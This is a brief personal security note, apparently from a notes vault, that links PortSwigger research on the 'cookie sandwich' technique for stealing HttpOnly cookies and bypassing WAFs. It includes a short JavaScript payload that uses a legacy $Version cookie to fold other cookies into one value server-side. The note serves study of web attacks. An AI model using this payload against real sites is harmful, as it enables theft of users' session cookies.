---
tags:
  - security
  - web
---
https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique
A method to steal httponly cookies.
Allows bypassing [[Web Application Firewall|WAF]] through legacy cookies like `$Version` that allow special characters to be included within the cookie value.
# Example Exploit
```js
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```